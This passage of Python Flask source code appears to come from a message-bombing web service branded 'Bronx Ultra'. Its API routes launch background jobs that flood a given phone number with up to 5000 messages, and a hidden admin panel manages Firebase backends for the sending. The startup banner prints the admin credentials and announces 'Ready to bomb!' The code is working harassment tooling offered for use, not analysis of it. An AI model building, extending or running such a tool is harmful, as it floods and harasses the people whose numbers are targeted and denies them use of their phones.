        return jsonify({"success": False, "error": "Invalid number"})
    if not message:
        return jsonify({"success": False, "error": "Message required"})
    if count < 1 or count > 5000:
        return jsonify({"success": False, "error": "Count must be 1-5000"})

    # Check firebases configured
    conn = get_db()
    fb_count = conn.execute("SELECT COUNT(*) FROM firebases").fetchone()[0]
    conn.close()
    if fb_count == 0:
        return jsonify({"success": False, "error": "No Firebase configured. Contact admin."})

    job_id = str(random.randint(10000000, 99999999))
    running_jobs[job_id] = {
        "stop": False,
        "sent": 0,
        "fail": 0,
        "status": "running",
        "mode": "custom",
        "count": count,
    }

    conn = get_db()
    conn.execute(
        "INSERT INTO jobs (id, mode, number, message, target_count, status) VALUES (?,?,?,?,?,?)",
        (job_id, "custom", number, message, count, "running")
    )
    conn.commit()
    conn.close()

    thread = threading.Thread(
        target=run_custom_bomb,
        args=(job_id, number, message, count),
        daemon=True
    )
    thread.start()

    return jsonify({"success": True, "job_id": job_id})


@app.route("/api/start-normal", methods=["POST"])
def api_start_normal():
    number = request.form.get("number", "").strip()
    try:
        count = int(request.form.get("count", 100))
    except ValueError:
        return jsonify({"success": False, "error": "Invalid count"})

    if not number or len(number) < 10:
        return jsonify({"success": False, "error": "Invalid number"})
    if count < 1 or count > 5000:
        return jsonify({"success": False, "error": "Count must be 1-5000"})

    job_id = str(random.randint(10000000, 99999999))
    running_jobs[job_id] = {
        "stop": False,
        "sent": 0,
        "fail": 0,
        "status": "running",
        "mode": "normal",
        "count": count,
    }

    conn = get_db()
    conn.execute(
        "INSERT INTO jobs (id, mode, number, message, target_count, status) VALUES (?,?,?,?,?,?)",
        (job_id, "normal", number, "", count, "running")
    )
    conn.commit()
    conn.close()

    thread = threading.Thread(
        target=run_normal_bomb,
        args=(job_id, number, count),
        daemon=True
    )
    thread.start()

    return jsonify({"success": True, "job_id": job_id})


@app.route("/api/stop-job/<job_id>", methods=["POST"])
def api_stop_job(job_id):
    if job_id in running_jobs:
        running_jobs[job_id]["stop"] = True
        return jsonify({"success": True})
    return jsonify({"success": False, "error": "Job not found"})


@app.route("/api/job-status/<job_id>")
def api_job_status(job_id):
    if job_id in running_jobs:
        job = running_jobs[job_id]
        return jsonify({
            "sent": job.get("sent", 0),
            "fail": job.get("fail", 0),
            "status": job.get("status", "running"),
        })

    # Check DB
    conn = get_db()
    row = conn.execute("SELECT * FROM jobs WHERE id=?", (job_id,)).fetchone()
    conn.close()
    if row:
        return jsonify({
            "sent": row["sent_count"],
            "fail": row["fail_count"],
            "status": row["status"],
        })
    return jsonify({"sent": 0, "fail": 0, "status": "unknown"})


# ============ ADMIN ROUTES ============
@app.route("/bronx-admin-panel", methods=["GET", "POST"])
def admin_login():
    if session.get("admin_logged_in"):
        return redirect(url_for("admin_panel"))

    if request.method == "POST":
        username = request.form.get("username", "")
        password = request.form.get("password", "")
        if username == ADMIN_USERNAME and password == ADMIN_PASSWORD:
            session["admin_logged_in"] = True
            return redirect(url_for("admin_panel"))
        else:
            flash("Invalid credentials", "error")

    return render_template_string(ADMIN_LOGIN_HTML)


@app.route("/bronx-admin-panel/panel")
@admin_required
def admin_panel():
    conn = get_db()
    firebases = [dict(r) for r in conn.execute("SELECT * FROM firebases ORDER BY id DESC").fetchall()]
    jobs = [dict(r) for r in conn.execute("SELECT * FROM jobs ORDER BY created_at DESC LIMIT 20").fetchall()]
    conn.close()
    return render_template_string(ADMIN_PANEL_HTML, firebases=firebases, jobs=jobs)


@app.route("/bronx-admin-panel/add-firebase", methods=["POST"])
@admin_required
def admin_add_firebase():
    name = request.form.get("name", "").strip()
    url = request.form.get("url", "").strip()

    if not name or not url:
        return jsonify({"success": False, "error": "Name and URL required"})

    # Test the firebase
    try:
        test_url = url.rstrip("/") + "/.json?shallow=true"
        resp = httpx.get(test_url, timeout=10.0)
        if resp.status_code not in [200]:
            return jsonify({"success": False, "error": f"Firebase returned {resp.status_code}. Check rules."})
    except Exception as e:
        return jsonify({"success": False, "error": f"Connection failed: {str(e)}"})

    conn = get_db()
    conn.execute("INSERT INTO firebases (name, url) VALUES (?,?)", (name, url))
    conn.commit()
    conn.close()

    return jsonify({"success": True})


@app.route("/bronx-admin-panel/delete-firebase/<int:fb_id>", methods=["POST"])
@admin_required
def admin_delete_firebase(fb_id):
    conn = get_db()
    conn.execute("DELETE FROM firebases WHERE id=?", (fb_id,))
    conn.commit()
    conn.close()
    return jsonify({"success": True})


@app.route("/bronx-admin-panel/logout")
def admin_logout():
    session.pop("admin_logged_in", None)
    return redirect(url_for("admin_login"))


# ============ RUN ============
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    print(f"""
    ╔══════════════════════════════════════╗
    ║      🔥 BRONX ULTRA STARTING 🔥      ║
    ╚══════════════════════════════════════╝
    
    🌐 Dashboard:    http://localhost:{port}
    🔐 Admin Panel:  http://localhost:{port}/bronx-admin-panel
    👤 Admin User:   {ADMIN_USERNAME}
    🔑 Admin Pass:   {ADMIN_PASSWORD}
    
    ⚡ Ready to bomb!
    """)
    app.run(host="0.0.0.0", port=port, debug=False)
